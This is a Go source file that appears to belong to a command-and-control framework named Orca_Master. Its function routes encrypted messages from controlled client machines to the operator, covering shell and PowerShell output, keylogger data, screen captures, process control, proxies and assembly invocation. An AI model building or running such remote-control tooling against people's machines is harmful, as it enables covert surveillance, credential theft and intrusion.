package stager

import (
	"Orca_Master/cli/common"
	"Orca_Master/cli/controller"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/tools/crypto"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/togettoyou/wsc"
)

func SettleMsg(message string, ws *wsc.Wsc) {
	if common.ClientId == "" {
		common.ClientId = common.GetClientId(message)
		return
	} else {
		msg, _, encData := common.SettleRetDataNotDec(message)
		switch msg {
		case "offline":
			decData, _ := crypto.DecryptBt(encData, []byte(config.AesKey))
			for _, hostlist := range controller.HostLists {
				if hostlist.ClientId == string(decData) {
					outputMsg := colorcode.OutputMessage(colorcode.SIGN_WARNING, fmt.Sprintf("client %s:%s_[%s]"+" is offline", hostlist.Ip, hostlist.ConnPort, decData))
					fmt.Println("\n" + outputMsg)
				}
			}
			if string(decData) == controller.SelectClientId {
				controller.BackMainMenu()
			}
			return
		case "online":
			var hostInfo common.HostInfo
			decData, _ := crypto.DecryptBt(encData, []byte(config.AesKey))
			err := json.Unmarshal(decData, &hostInfo)
			if err != nil {
				return
			}
			outputMsg := colorcode.OutputMessage(colorcode.SIGN_NOTICE, fmt.Sprintf(" new client %s:%s_[%s] is online", hostInfo.Ip, hostInfo.ConnPort, hostInfo.ClientId))
			fmt.Println("\n" + outputMsg)
			return
		case "listHosts_ret":
			common.DefaultMsgChan <- message
			return
		case "ipSearch_ret":
			common.DefaultMsgChan <- message
			return
		case "sliceData":
			decData, _ := crypto.DecryptBt(encData, []byte(config.AesKey))
			common.FileSliceMsgChan <- decData
			return
		case "screenSliceData":
			decData, _ := hex.DecodeString(encData)
			common.ScreenSliceMsgChan <- decData
			return
		case "execShell_ret":
			common.ExecShellMsgChan <- message
			return
		case "execPowershell_ret":
			common.ExecShellMsgChan <- message
			return
		case "execPty_ret":
			common.ExecPtyMsgChan <- message
			return
		case "processList_ret":
			decData, _ := crypto.Decrypt(encData, []byte(config.AesKey))
			common.ProcessListChan <- decData
			return
		case "processKill_ret":
			decData, _ := crypto.Decrypt(encData, []byte(config.AesKey))
			common.DefaultMsgChan <- decData
			return
		case "info_ret":
			decData, _ := crypto.Decrypt(encData, []byte(config.AesKey))
			common.DefaultMsgChan <- decData
			return
		case "proxyClientStart_ret":
			common.DefaultMsgChan <- encData
			return
		case "proxyClientList_ret":
			common.DefaultMsgChan <- encData
			return
		case "assemblyList_ret":
			common.AssemblyListMsgChan <- message
			return
		case "assemblyInvoke_ret":
			common.AssemblyInvokeMsgChan <- message
			return
		case "keyloggerData":
			decData, _ := crypto.DecryptBt(encData, []byte(config.AesKey))
			common.KeyloggerDataChan <- string(decData)
			return
		default:
			common.DefaultMsgChan <- message
			return
		}
	}
}
